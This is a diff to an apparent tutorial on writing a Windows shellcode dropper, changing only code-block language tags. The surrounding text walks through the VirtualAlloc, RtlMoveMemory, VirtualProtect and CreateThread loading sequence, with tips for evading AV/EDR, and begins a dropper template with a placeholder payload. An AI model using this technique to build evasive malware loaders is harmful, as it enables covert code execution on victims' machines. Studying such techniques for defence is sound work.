@@ -30,18 +30,18 @@ The 3 sections that we can make use of for our payload/shellcode are the .data (
 
 Firstly, we want to reserve space in memory for our code and that can be accomplished by using the ```VirtualAlloc``` API. We allocate the memory space and also tell Windows what protections to apply (Read and Write) to the memory space ```flProtect``` (very important for detection considerations).
 
-```c#
+```c++
 VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
 ```
 Secondly, we want to copy our payload (assigned to a variable in our template) into the newly reserved memory space with the ```RtlMoveMemory``` API.
 
-```c#
+```c++
 RtlMoveMemory(VOID *Destination, VOID *Source, SIZE_T Length);
 ```
 
 Thirdly, we change the protection on the assigned memory region to make it executable (Read, Write, Execute) by using the ```VirtualProtect``` API. Changing the memory protection after assignment is slightly less suspicious for AV/EDR tools.
 
-```c#
+```c++
 VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 ```
 
@@ -49,12 +49,12 @@ Lastly we make use of the ```CreateThread``` API to execute our code in a new th
 
 Our template for our dropper should now look like this:
 
-```c#
+```c++
 unsigned char payload[] = {SHELLCODE};
 unsigned int payload_length = SHELLCODE_LENGTH;
 ```
 
-```c#
+```c++
 int main(void) {
 
 // Reserve space in memory for our payload
